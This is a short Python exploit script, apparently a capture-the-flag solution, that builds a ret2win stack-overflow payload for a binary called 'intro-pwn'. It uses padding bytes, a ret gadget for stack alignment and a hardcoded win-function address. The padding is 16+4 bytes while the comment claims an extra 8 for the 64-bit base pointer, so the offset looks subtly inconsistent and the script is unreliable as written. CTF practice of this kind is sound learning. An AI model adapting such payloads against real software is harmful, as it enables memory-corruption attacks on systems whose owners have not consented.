import struct
import sys

overwrite = b"A"*(16+4) # buffer to overwrite is 16 bytes and we also wanna overwrite the basepointer so we add an extra 8 (32bit = ebp | 64bit = rbp)
ret = struct.pack("<Q", 0x401120) # ret gadget we have to stick in the stack to realign it
ret2win =struct.pack("<Q", 0x4011c7) #this is the actual adress of the win function (simple no pie so we just checked with nm ./intro-pwn | grep win)

payload = overwrite + ret + ret2win
sys.stdout.buffer.write(payload) #write as bytes 